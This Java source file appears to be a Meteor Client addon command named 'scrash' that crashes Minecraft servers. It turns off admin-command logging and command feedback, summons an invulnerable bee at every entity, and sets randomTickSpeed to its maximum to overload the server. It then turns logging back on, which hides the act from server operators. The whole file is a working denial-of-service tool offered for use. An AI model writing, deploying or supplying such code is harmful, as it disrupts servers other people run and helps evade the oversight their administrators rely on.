package spigey.asteroide.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.commands.SharedSuggestionProvider;

import static spigey.asteroide.util.msg;
import static spigey.asteroide.util.perm;

public class ServerCrash extends Command {
    public ServerCrash() {
        super("scrash", "Crashes the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<SharedSuggestionProvider> builder) {
        builder.executes(context -> {
            error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
            info("Attempting to crash the server");
            assert mc.player != null;
            if(!mc.player.hasPermissions(2)){
                error(perm(2));
            }
            if(mc.player.hasPermissions(2)){
                msg("/gamerule logAdminCommands false");
                msg("/gamerule sendCommandFeedback false");
            }
            msg("/execute as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
            msg("/gamerule randomTickSpeed 2147483647");
            if(mc.player.hasPermissions(2)){
                msg("/save-all");
                msg("/gamerule sendCommandFeedback true");
                msg("/gamerule logAdminCommands true");
            }
            return SINGLE_SUCCESS;
        });
    }
}
